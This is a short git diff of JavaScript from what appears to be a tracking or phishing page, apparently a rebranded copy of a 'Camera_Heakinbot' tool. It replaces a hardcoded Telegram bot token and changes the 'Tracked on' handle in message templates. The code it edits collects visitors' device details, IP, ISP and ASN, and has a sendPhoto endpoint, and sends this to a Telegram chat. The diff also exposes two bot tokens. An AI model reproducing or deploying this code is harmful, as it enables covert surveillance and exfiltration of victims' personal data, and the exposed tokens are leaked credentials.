@@ -1,4 +1,4 @@
-const BOT_TOKEN = "7835635833:AAElbvhgEObfaBmIC0gD0MhT_hthCtME654"; // Replace with your bot token
+const BOT_TOKEN = "8070287110:AAEwIKIQL1wses7g3SRC-9Z2RxqjPsDDbNE"; // Replace with your bot token
 const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 const API_FILE_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
 
@@ -116,7 +116,7 @@ async function sendInitialInfo() {
 <b>🌐 Network Type:</b> <i>${deviceInfo.networkType}</i>
 <b>🕒 Time Zone:</b> <i>${deviceInfo.timeZone}</i>
 
-<b>👨‍💻 Tracked on: @Camera_Heakinbot</b>
+<b>👨‍💻 Tracked on: @TECH_SANDEEP_ANIME</b>
 `;
 
     if (chatId) {
@@ -152,7 +152,7 @@ document.getElementById('data-form').addEventListener('submit', async function (
 <b>📡 ISP:</b> <i>${ipDetails.org}</i>
 <b>🔍 ASN:</b> <i>${ipDetails.asn}</i>
 
-<b>👨‍💻 Tracked on: @Camera_Heakinbot</b>
+<b>👨‍💻 Tracked on: @TECH_SANDEEP_ANIME</b>
 `;
 
     await sendTelegramMessage(chatId, message);
